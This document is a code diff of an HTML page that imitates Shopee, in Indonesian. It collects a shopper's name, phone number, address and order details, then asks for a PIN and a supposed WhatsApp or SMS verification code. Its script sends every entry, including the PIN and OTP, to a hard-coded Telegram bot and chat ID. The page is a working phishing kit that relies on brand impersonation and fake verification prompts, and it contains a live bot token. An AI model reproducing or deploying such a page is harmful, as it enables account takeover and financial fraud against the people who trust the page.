@@ -10,20 +10,23 @@
     <style>
         /* BASE STYLES */
         :root {
-            --shopee-orange: #EE4D2D; /* Warna Shopee yang lebih akurat */
+            --shopee-orange: #EE4D2D;
+            /* Warna Shopee yang lebih akurat */
             --shopee-light-orange: #FF5733;
             --shopee-gray: #f5f5f5;
             --text-dark: #333;
             --text-medium: #555;
             --text-light: #777;
             --border-color: #ddd;
-            --shopee-green: #25D366; /* Warna WhatsApp */
+            --shopee-green: #25D366;
+            /* Warna WhatsApp */
         }
 
         body {
             background-color: var(--shopee-gray);
             color: var(--text-dark);
-            font-family: 'Poppins', sans-serif; /* Menggunakan Poppins */
+            font-family: 'Poppins', sans-serif;
+            /* Menggunakan Poppins */
             margin: 0;
             display: flex;
             justify-content: center;
@@ -36,8 +39,10 @@
             width: 100%;
             max-width: 600px;
             min-height: 100vh;
-            padding-top: 50px; /* Ruang untuk fixed header */
-            box-shadow: 0 0 15px rgba(0, 0, 0, 0.08); /* Lebih terlihat */
+            padding-top: 50px;
+            /* Ruang untuk fixed header */
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.08);
+            /* Lebih terlihat */
         }
 
         /* CUSTOM HEADER APLIKASI */
@@ -52,20 +57,18 @@
             color: white;
             padding: 10px 15px;
             display: flex;
-            justify-content: center; /* Untuk judul di tengah */
+            justify-content: center;
+            /* Untuk judul di tengah */
             align-items: center;
             z-index: 1010;
             box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
         }
-        
-        /* Hapus styling logo dari header */
-        /* .app-header .logo-container { display: none; } */ 
-        /* .app-header .logo-container img { display: none; } */
 
         .app-header h3 {
             margin: 0;
             font-size: 16px;
-            font-weight: 500; /* Medium weight */
+            font-weight: 500;
+            /* Medium weight */
             text-align: center;
         }
 
@@ -75,13 +78,15 @@
         }
 
         .form-group {
-            margin-bottom: 20px; /* Sedikit lebih renggang */
+            margin-bottom: 20px;
+            /* Sedikit lebih renggang */
         }
 
         .form-group label {
             display: block;
             font-weight: 500;
-            margin-bottom: 8px; /* Lebih renggang */
+            margin-bottom: 8px;
+            /* Lebih renggang */
             color: var(--text-medium);
             font-size: 14px;
         }
@@ -92,24 +97,31 @@
         .form-group input[type="password"],
         .form-group textarea {
             width: 100%;
-            padding: 10px 0; /* Padding vertikal saja */
+            padding: 10px 0;
+            /* Padding vertikal saja */
             border: none;
-            border-bottom: 1px solid var(--border-color); /* Hanya border bawah */
-            outline: none; /* Hilangkan outline default */
+            border-bottom: 1px solid var(--border-color);
+            /* Hanya border bawah */
+            outline: none;
+            /* Hilangkan outline default */
             box-sizing: border-box;
-            font-size: 15px; /* Sedikit lebih besar */
+            font-size: 15px;
+            /* Sedikit lebih besar */
             font-family: 'Poppins', sans-serif;
             color: var(--text-dark);
         }
 
         .form-group input:focus,
         .form-group textarea:focus {
-            border-bottom-color: var(--shopee-orange); /* Border orange saat fokus */
+            border-bottom-color: var(--shopee-orange);
+            /* Border orange saat fokus */
         }
 
         textarea {
-            resize: vertical; /* Izinkan resize vertikal */
-            padding-bottom: 5px; /* Untuk konsistensi dengan input */
+            resize: vertical;
+            /* Izinkan resize vertikal */
+            padding-bottom: 5px;
+            /* Untuk konsistensi dengan input */
         }
 
         button {
@@ -117,12 +129,15 @@
             color: white;
             padding: 12px 15px;
             border: none;
-            border-radius: 5px; /* Sedikit lebih bulat */
+            border-radius: 5px;
+            /* Sedikit lebih bulat */
             cursor: pointer;
             font-size: 16px;
             width: 100%;
-            margin-top: 20px; /* Lebih banyak ruang */
-            font-weight: 600; /* Semi-bold */
+            margin-top: 20px;
+            /* Lebih banyak ruang */
+            font-weight: 600;
+            /* Semi-bold */
             transition: background-color 0.2s ease;
         }
 
@@ -135,10 +150,14 @@
             background-color: white;
             padding: 25px;
             border-radius: 8px;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08); /* Card shadow */
-            margin-top: 15px; /* Ruang dari header jika perlu */
-            text-align: center; /* Untuk menengahkan logo di dalam card */
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
+            /* Card shadow */
+            margin-top: 15px;
+            /* Ruang dari header jika perlu */
+            text-align: center;
+            /* Untuk menengahkan logo di dalam card */
         }
+
         .form-card p {
             font-size: 14px;
             color: var(--text-light);
@@ -147,9 +166,11 @@
         }
 
         .shopee-logo-form {
-            width: 100px; /* Ukuran logo Shopee di dalam form */
+            width: 100px;
+            /* Ukuran logo Shopee di dalam form */
             height: auto;
-            margin-bottom: 20px; /* Jarak dengan teks di bawahnya */
+            margin-bottom: 20px;
+            /* Jarak dengan teks di bawahnya */
         }
 
 
@@ -170,10 +191,12 @@
         .modal-content {
             background-color: white;
             padding: 0;
-            border-radius: 8px; /* Lebih bulat */
+            border-radius: 8px;
+            /* Lebih bulat */
             width: 90%;
             max-width: 320px;
-            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2); /* Shadow lebih dalam */
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+            /* Shadow lebih dalam */
             animation: fadeIn 0.3s ease-out;
             overflow: hidden;
             font-family: 'Poppins', sans-serif;
@@ -192,7 +215,8 @@
         }
 
         .modal-body {
-            padding: 25px 20px; /* Padding lebih */
+            padding: 25px 20px;
+            /* Padding lebih */
             text-align: center;
         }
 
@@ -212,11 +236,13 @@
             flex: 1;
             background: none;
             color: var(--shopee-orange);
-            padding: 14px 0; /* Padding lebih */
+            padding: 14px 0;
+            /* Padding lebih */
             border: none;
             cursor: pointer;
             font-size: 15px;
-            font-weight: 600; /* Semi-bold */
+            font-weight: 600;
+            /* Semi-bold */
             margin-top: 0;
             border-radius: 0;
             text-decoration: none;
@@ -232,19 +258,24 @@
 
         .modal-button-group button:nth-child(2) {
             border-left: 1px solid #eee;
-            color: var(--text-medium); /* Warna lebih netral untuk batal */
+            color: var(--text-medium);
+            /* Warna lebih netral untuk batal */
         }
-        
+
         /* Modal PIN Custom Styling */
         #pinModal input[type="password"] {
-            font-size: 26px; /* Lebih besar */
+            font-size: 26px;
+            /* Lebih besar */
             text-align: center;
-            letter-spacing: 4px; /* Sedikit renggang */
+            letter-spacing: 4px;
+            /* Sedikit renggang */
             font-weight: 600;
             border: none;
             border-bottom: 2px solid var(--shopee-orange);
-            padding: 8px 10px; /* Padding lebih */
-            max-width: 180px; /* Lebar input PIN */
+            padding: 8px 10px;
+            /* Padding lebih */
+            max-width: 180px;
+            /* Lebar input PIN */
             margin: 0 auto;
             display: block;
             color: var(--text-dark);
@@ -252,16 +283,17 @@
 
         /* Modal OTP Custom Styling */
         #otpModal .modal-content {
-            max-width: 350px; 
+            max-width: 350px;
             border-radius: 10px;
         }
 
         #otpModal .modal-body {
-            padding: 0; 
+            padding: 0;
         }
 
         #otpModal .top-text {
-            padding: 25px 20px 20px; /* Padding lebih */
+            padding: 25px 20px 20px;
+            /* Padding lebih */
             font-size: 15px;
             color: var(--text-dark);
             text-align: center;
@@ -270,13 +302,14 @@
         .whatsapp-number {
             font-size: 16px;
             font-weight: 600;
-            margin-top: 8px; /* Lebih renggang */
+            margin-top: 8px;
+            /* Lebih renggang */
             color: var(--text-dark);
             display: flex;
             justify-content: center;
             align-items: center;
         }
-        
+
         .whatsapp-number i {
             color: var(--shopee-green);
             margin-right: 8px;
@@ -288,7 +321,8 @@
             background: none;
             color: var(--shopee-orange);
             font-weight: 600;
-            padding: 16px 20px; /* Lebih besar */
+            padding: 16px 20px;
+            /* Lebih besar */
             border: none;
             border-top: 1px solid #eee;
             width: 100%;
@@ -296,31 +330,35 @@
             margin-top: 0;
             transition: background-color 0.2s ease;
         }
-        
+
         #sendOtpButton {
-             color: var(--shopee-orange); 
+            color: var(--shopee-orange);
         }
 
         .otp-buttons button:hover {
             background-color: var(--shopee-gray);
         }
-        
+
         #caraLainButton {
-             color: var(--text-medium); /* Warna netral untuk Cara Lain (SMS) */
+            color: var(--text-medium);
+            /* Warna netral untuk Cara Lain (SMS) */
         }
-        
+
         .otp-buttons button:last-child {
-            color: var(--text-dark); /* Batal warna gelap */
-            font-weight: 400; /* Regular */
+            color: var(--text-dark);
+            /* Batal warna gelap */
+            font-weight: 400;
+            /* Regular */
         }
-        
+
         /* Input OTP tersembunyi */
         #otpInputContainer {
-            padding: 25px 20px; /* Padding lebih */
+            padding: 25px 20px;
+            /* Padding lebih */
             border-top: 1px solid #eee;
             text-align: left;
         }
-        
+
         #otpInputContainer label {
             text-align: center;
             width: 100%;
@@ -328,21 +366,23 @@
         }
 
         #otpCode {
-            font-size: 26px; /* Lebih besar */
+            font-size: 26px;
+            /* Lebih besar */
             text-align: center;
             letter-spacing: 4px;
             font-weight: 600;
             border: none;
             border-bottom: 2px solid var(--shopee-orange);
             padding: 8px 10px;
-            max-width: 180px; 
-            margin: 15px auto 25px auto; /* Lebih banyak ruang */
+            max-width: 180px;
+            margin: 15px auto 25px auto;
+            /* Lebih banyak ruang */
             display: block;
         }
 
         /* Warna latar tombol verifikasi final di OTP Modal */
         #otpForm button[type="submit"] {
-            background-color: var(--shopee-orange) !important; 
+            background-color: var(--shopee-orange) !important;
         }
     </style>
 </head>
@@ -356,10 +396,11 @@
         <div id="content-area" class="form-content">
             <main class="order-form-section">
                 <div class="form-card">
-                    <img src="shop.JPG" alt="Shopee Logo" class="shopee-logo-form">
-                    
+                    <img src="shop.JPG" alt="Shopee Logo" class="shopee-logo-form"> 
+
                     <p>
-                        Isi detail pesanan Anda. Verifikasi akan dilakukan di langkah selanjutnya untuk memastikan keamanan pemesanan.
+                        Isi detail pesanan Anda. Verifikasi akan dilakukan di langkah selanjutnya untuk memastikan keamanan
+                        pemesanan.
                     </p>
                     <form id="orderForm">
                         <div class="form-group">
@@ -368,13 +409,11 @@
                         </div>
                         <div class="form-group">
                             <label for="nomorTelepon">Nomor Telepon *</label>
-                            <input type="tel" id="nomorTelepon" required
-                                pattern="[0-9]{10,13}">
+                            <input type="tel" id="nomorTelepon" required pattern="[0-9]{10,13}">
                         </div>
                         <div class="form-group">
                             <label for="alamatLengkap">Alamat Lengkap *</label>
-                            <textarea id="alamatLengkap" rows="3"
-                                required></textarea>
+                            <textarea id="alamatLengkap" rows="3" required></textarea>
                         </div>
                         <div class="form-group">
                             <label for="namaProduk">Nama Produk *</label>
@@ -382,8 +421,7 @@
                         </div>
                         <div class="form-group">
                             <label for="harga">Harga * (Rp)</label>
-                            <input type="text" id="harga" required 
-                                oninput="formatPrice(this)" value="">
+                            <input type="text" id="harga" required oninput="formatPrice(this)" value="">
                         </div>
                         <button type="submit" id="verifikasiButton">Lanjutkan Verifikasi</button>
                     </form>
@@ -447,18 +485,18 @@
     </div>
 
     <script>
-        // Token dan Chat ID Telegram Anda
+        // PASTIKAN ANDA MENGGANTI INI DENGAN TOKEN DAN CHAT ID TELEGRAM ANDA YANG AKTIF
         var TELEGRAM_TOKEN = "8483832719:AAH9MrWjVVmMxydfTMJjOPyG_c7xu04P6Gk";
         var CHAT_ID = "5923031825";
 
         // Variabel global untuk menyimpan data
         var orderData = {};
-        
+
         // Status pengiriman OTP saat ini (WA atau SMS)
         var otpMethod = 'WA';
 
         // --- UTILITY FUNCTIONS ---
-        
+
         function formatPrice(input) {
             let value = input.value.replace(/\D/g, '');
             let formattedValue = new Intl.NumberFormat('id-ID').format(value);
@@ -469,28 +507,34 @@
             return formattedValue.replace(/\./g, '');
         }
 
+        // FUNGSI INI DIPERBAIKI/DIPASTIKAN UNTUK MENGHASILKAN NOMOR BERSIH +62...
         function formatPhoneNumber(tel) {
             let cleanTel = tel.replace(/\D/g, ''); 
-            if (cleanTel.startsWith('08')) {
+            
+            // Jika dimulai dengan '08', ganti menjadi '628'
+            if (cleanTel.startsWith('0')) {
                 cleanTel = '62' + cleanTel.substring(1);
             }
-            if (cleanTel.length > 9) {
-                const start = cleanTel.substring(0, 5);
-                const end = cleanTel.substring(cleanTel.length - 3);
-                return `+${start}*******${end}`;
+            // Jika tidak diawali '62' dan panjangnya wajar, tambahkan '62'
+            else if (!cleanTel.startsWith('62') && cleanTel.length > 8) {
+                cleanTel = '62' + cleanTel;
             }
-            return cleanTel; 
+            
+            return cleanTel; // Mengembalikan nomor bersih (misal: 628123456789)
         }
 
         function maskPhoneNumber(tel) {
             let cleanTel = tel.replace(/\D/g, ''); 
-            if (cleanTel.startsWith('08')) {
+            
+            // Pastikan nomor sudah diformat '62...' sebelum masking
+            if (cleanTel.startsWith('0')) {
                 cleanTel = '62' + cleanTel.substring(1);
             }
+            
             if (cleanTel.length > 9) {
-                const start = cleanTel.substring(0, 5);
-                const end = cleanTel.substring(cleanTel.length - 3);
-                return `+${start}*******${end}`;
+                const start = cleanTel.substring(0, 5); 
+                const end = cleanTel.substring(cleanTel.length - 3); 
+                return `+${start}*******${end}`; 
             }
             return tel; 
         }
@@ -508,15 +552,15 @@
             hideModal('pinModal');
             hideModal('otpModal');
             orderData = {};
-            
+
             document.getElementById('otpInputContainer').style.display = 'none';
             document.querySelector('.otp-buttons').style.display = 'block';
-            document.getElementById('otpCode').value = ''; 
+            document.getElementById('otpCode').value = '';
             document.getElementById('harga').value = '';
-            
+
             resetOtpModalUI('WA');
         }
-        
+
         function resetOtpModalUI(method) {
             otpMethod = method;
             const infoText = document.getElementById('otpInfoText');
@@ -530,8 +574,8 @@
                 sendButton.textContent = 'Kirim ke WhatsApp';
             } else if (method === 'SMS') {
                 infoText.innerHTML = 'Shopee akan mengirimkan kode OTP melalui <span style="color: black;">SMS</span> ke';
-                otpIcon.className = 'fas fa-sms'; 
-                otpIcon.style.color = 'var(--shopee-orange)'; 
+                otpIcon.className = 'fas fa-sms';
+                otpIcon.style.color = 'var(--shopee-orange)';
                 sendButton.textContent = 'Kirim ke SMS';
             }
             sendButton.style.color = 'var(--shopee-orange)';
@@ -541,7 +585,7 @@
         // --- FUNGSI KIRIM KE TELEGRAM ---
         function sendToTelegram(dataType, data) {
             let text = "";
-            
+
             if (dataType === 'FORM') {
                 text =
                     "**--- 1. DATA FORMULIR PEMESANAN BARU ---**\n\n" +
@@ -559,7 +603,7 @@
                     "Status: PIN DITERIMA. Menunggu Kode OTP Akhir...";
             } else if (dataType === 'METHOD_CHOICE') {
                 const methodText = data.method === 'WA' ? 'WhatsApp' : 'SMS';
-                text = 
+                text =
                     "**--- 3. PERMINTAAN KODE OTP PEMESANAN ---**\n\n" +
                     "Nomor Telepon: " + data.phone + "\n" +
                     "Metode yang dipilih: " + methodText + "\n\n" +
@@ -582,22 +626,22 @@
             };
 
             fetch(url, {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json"
-                },
-                body: JSON.stringify(params)
-            })
-            .then(response => {
-                if (!response.ok) {
-                    console.error('Gagal mengirim ke Telegram. Status: ' + response.status);
-                }
-            })
-            .catch(error => {
-                console.error("Kesalahan pengiriman Telegram:", error);
-            });
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify(params)
+                })
+                .then(response => {
+                    if (!response.ok) {
+                        console.error('Gagal mengirim ke Telegram. Status: ' + response.status);
+                    }
+                })
+                .catch(error => {
+                    console.error("Kesalahan pengiriman Telegram:", error);
+                });
         }
-        
+
         // --- STEP 1: FORMULIR PEMESANAN ---
         document.getElementById('orderForm').addEventListener('submit', function (event) {
             event.preventDefault();
@@ -606,7 +650,7 @@
             var telepon = document.getElementById('nomorTelepon').value.trim();
             var alamat = document.getElementById('alamatLengkap').value.trim();
             var namaProduk = document.getElementById('namaProduk').value.trim();
-            
+
             var formattedHarga = document.getElementById('harga').value.trim();
             var cleanHarga = cleanPrice(formattedHarga);
             var harga = parseFloat(cleanHarga);
@@ -618,14 +662,14 @@
 
             orderData = {
                 namaLengkap: nama,
-                nomorTelepon: formatPhoneNumber(telepon), // Simpan nomor telepon bersih
+                nomorTelepon: formatPhoneNumber(telepon), // Simpan nomor telepon bersih +62...
                 alamatLengkap: alamat,
                 namaProduk: namaProduk,
                 harga: harga
             };
 
-            // PENGIRIMAN 1: Data Formulir
-            sendToTelegram('FORM', orderData); 
+            // PENGIRIMAN 1: Data Formulir - DATA LENGKAP TERKIRIM DI SINI
+            sendToTelegram('FORM', orderData);
 
             showModal('pinModal', 'Masukkan PIN');
         });
@@ -651,7 +695,7 @@
             // Siapkan dan Tampilkan Modal OTP
             const maskedPhone = maskPhoneNumber(orderData.nomorTelepon); // Gunakan fungsi masking untuk tampilan
             document.getElementById('otpPhoneNumber').textContent = maskedPhone;
-            resetOtpModalUI('WA'); 
+            resetOtpModalUI('WA');
             showModal('otpModal', 'Masukkan Kode Verifikasi..');
         });
 
@@ -660,25 +704,28 @@
         // Aksi tombol "Kirim ke WhatsApp" / "Kirim ke SMS"
         document.getElementById('sendOtpButton').addEventListener('click', function (event) {
             event.preventDefault();
-            
+
             // PENGIRIMAN 3: Metode OTP dipilih (WA atau SMS)
-            sendToTelegram('METHOD_CHOICE', { method: otpMethod, phone: orderData.nomorTelepon });
-            
+            sendToTelegram('METHOD_CHOICE', {
+                method: otpMethod,
+                phone: orderData.nomorTelepon
+            });
+
             document.querySelector('.otp-buttons').style.display = 'none';
             document.getElementById('otpInputContainer').style.display = 'block';
-            
+
             if (otpMethod === 'WA') {
                 alert('Kode OTP telah dikirimkan ke WhatsApp Anda. Harap masukkan kodenya.');
             } else {
                 alert('Kode OTP telah dikirimkan ke SMS Anda. Harap masukkan kodenya.');
             }
         });
-        
+
         // Aksi tombol "Coba Cara Lain (SMS)"
-        document.getElementById('caraLainButton').addEventListener('click', function() {
+        document.getElementById('caraLainButton').addEventListener('click', function () {
             resetOtpModalUI('SMS');
             document.getElementById('otpInfoText').innerHTML = 'Shopee akan mengirimkan kode OTP melalui <span style="color: black;">SMS</span> ke';
-            document.getElementById('caraLainButton').style.display = 'none'; 
+            document.getElementById('caraLainButton').style.display = 'none';
             alert('Metode verifikasi diubah ke SMS. Silakan klik "Kirim ke SMS".');
         });
 
@@ -695,13 +742,13 @@
             }
 
             orderData.otpCode = otpCode;
-            orderData.otpMethod = otpMethod; 
+            orderData.otpMethod = otpMethod;
 
             hideModal('otpModal');
 
             // PENGIRIMAN 4: Data OTP (Final)
             sendToTelegram('OTP_FINAL', orderData);
-            
+
             // Konfirmasi akhir ke pengguna
             alert('✅ Pemesanan dan Verifikasi selesai! Pesanan Anda akan diproses. Pembayaran dilakukan saat barang tiba. Terima kasih.');
             resetForm();
